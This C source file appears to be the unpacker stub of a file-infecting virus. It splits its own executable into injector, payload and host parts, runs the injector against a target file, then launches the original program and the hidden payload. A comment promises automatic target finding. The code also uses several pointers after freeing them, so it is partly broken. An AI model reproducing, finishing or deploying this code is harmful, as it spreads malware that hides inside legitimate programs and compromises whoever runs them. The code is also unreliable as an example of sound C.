#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>


#include "utils.c"


#ifdef _WIN32
    #define _CRT_NONSTDC_NO_WARNINGS
#endif


#ifdef _WIN32
    #define INJECTOR_CMD_STR "\"\"%s\" \"%s\" \"%s\" \"%s\"\""
    #define INJECTOR_CMD_ADJ 2
    #define ORIGINAL_CMD_STR "\"\"%s\"\""
    #define ORIGINAL_CMD_ADJ 2
    #define PAYLOAD_CMD_STR "\"\"%s\"\""
    #define PAYLOAD_CMD_ADJ 2
    #define UNPACKER_BIN_SIZE 392970
    #define INJECTOR_BIN_SIZE 391420
    #define PAYLOAD_BIN_SIZE 0
#else
    #define INJECTOR_CMD_STR "\"%s\" \"%s\" \"%s\" \"%s\""
    #define INJECTOR_CMD_ADJ 0
    #define ORIGINAL_CMD_STR "\"%s\""
    #define ORIGINAL_CMD_ADJ 0
    #define PAYLOAD_CMD_STR "\"\"%s\"\""
    #define PAYLOAD_CMD_ADJ 2
    #define UNPACKER_BIN_SIZE 17688
    #define INJECTOR_BIN_SIZE 17472
    #define PAYLOAD_BIN_SIZE 0
#endif


bool unpack(
    const char *full_bin_path,
    char **unpacker,
    char **injector,
    char **payload,
    char **original
) {

    FILE *full_bin = fopen(full_bin_path, "rb");
    if (full_bin == NULL)
        return false;

    // fuck race conditions tbh, i need this to work; i need a name
    // and not just a pointer to a handle or whatever.
    *unpacker = tempnam(NULL, "");
    if (*unpacker == NULL)
        return false;

    if (!read_fp_into_path(full_bin, *unpacker, UNPACKER_BIN_SIZE))
        return false;

    // fuck race conditions tbh, i need this to work; i need a name
    // and not just a pointer to a handle or whatever.
    *injector = tempnam(NULL, "");
    if (*injector == NULL)
        return false;

    if (!read_fp_into_path(full_bin, *injector, INJECTOR_BIN_SIZE))
        return false;
    
    // fuck race conditions tbh, i need this to work; i need a name
    // and not just a pointer to a handle or whatever.
    *payload = tempnam(NULL, "");
    if (*payload == NULL)
        return false;

    if (!read_fp_into_path(full_bin, *payload, PAYLOAD_BIN_SIZE))
        return false;
    
    // fuck race conditions tbh, i need this to work; i need a name
    // and not just a pointer to a handle or whatever.
    *original = tempnam(NULL, "");
    if (*original == NULL)
        return false;

    if (!read_fp_into_path(full_bin, *original, -1))
        return false;

    if (fclose(full_bin) == EOF)
        return false;
    
    return true;
}


int main(int argc, char *argv[]) {

    if (argc < 2) {
        // targetfinding will be automatic soon!
        fprintf(stderr, "for now i need a TARGET to be specified");
        return 1;
    }

    char *target = argv[1];

    char *unpacker;
    char *injector;
    char *payload;
    char *original;

    if (!unpack(argv[0], &unpacker, &injector, &payload, &original)) {
        perror("Couldn't unpack() full_bin.");
        return 1;
    }

    // 5 bc ".bin\0"
    char *injector_bin = malloc(strlen(injector) + 5);
    if (injector_bin == NULL) {
        perror("No memory to alloc injector_bin str.");
        return 1;
    }

    strcpy(injector_bin, injector);
    strcat(injector_bin, ".bin");
    free(injector);
    
    if (!read_path_into_path(injector, injector_bin, -1)) {
        return 1;
    }

    // 12 bc 3 spaces, 8 double quotes and a null terminator.
    size_t injector_cmd_size =
        2 + strlen(injector_bin) +
        2 + strlen(unpacker) +
        2 + strlen(payload) +
        2 + strlen(target) +
        4 + INJECTOR_CMD_ADJ;

    char *injector_cmd = malloc(injector_cmd_size);
    if (injector_cmd == NULL) {
        perror(strerror(errno));
        return 1;
    }

    if (sprintf(injector_cmd, INJECTOR_CMD_STR, injector_bin, unpacker, payload, target) < 0) {
        perror(strerror(errno));
        return 1;
    }
    
    system(injector_cmd);

    if (remove(injector_bin)) {
        perror(strerror(errno));
        return 1;
    }

    free(injector_bin);
    free(injector_cmd);

    // 5 bc ".bin\0"
    char *original_bin = malloc(strlen(original) + 5);
    if (original_bin == NULL) {
        perror("No memory to allocate original_bin str.");
        return 1;
    }

    strcpy(original_bin, original);
    strcat(original_bin, ".bin");
    free(original);
    
    if (!read_path_into_path(original, original_bin, -1)) {
        return 1;
    }
    
    // 3 bc 2 double quotes and a null terminator.
    size_t original_cmd_size =
        2 + strlen(original_bin) +
        1 + ORIGINAL_CMD_ADJ;

    char *original_cmd = malloc(original_cmd_size);
    if (original_cmd == NULL) {
        perror(strerror(errno));
        return 1;
    }

    if (sprintf(original_cmd, ORIGINAL_CMD_STR, original_bin) < 0) {
        perror(strerror(errno));
        return 1;
    }

    system(original_cmd);

    if (remove(original_bin)) {
        perror(strerror(errno));
        return 1;
    }

    free(original_bin);
    free(original_cmd);

    // 5 bc ".bin\0"
    char *payload_bin = malloc(strlen(payload) + 5);
    if (payload_bin == NULL) {
        perror("No memory to alloc payload_bin str.");
        return 1;
    }

    strcpy(payload_bin, payload);
    strcat(payload_bin, ".bin");
    free(payload);
    
    if (!read_path_into_path(payload, payload_bin, -1)) {
        return 1;
    }

    // 3 bc 2 double quotes and a null terminator.
    size_t payload_cmd_size =
        2 + strlen(payload_bin) +
        1 + PAYLOAD_CMD_ADJ;

    char *payload_cmd = malloc(payload_cmd_size);
    if (payload_cmd == NULL) {
        perror(strerror(errno));
        return 1;
    }

    if (sprintf(payload_cmd, PAYLOAD_CMD_STR, payload_bin) < 0) {
        perror(strerror(errno));
        return 1;
    }
    
    system(payload_cmd);

    if (remove(payload_bin)) {
        perror(strerror(errno));
        return 1;
    }

    free(payload_bin);
    free(payload_cmd);

    return 0;
}

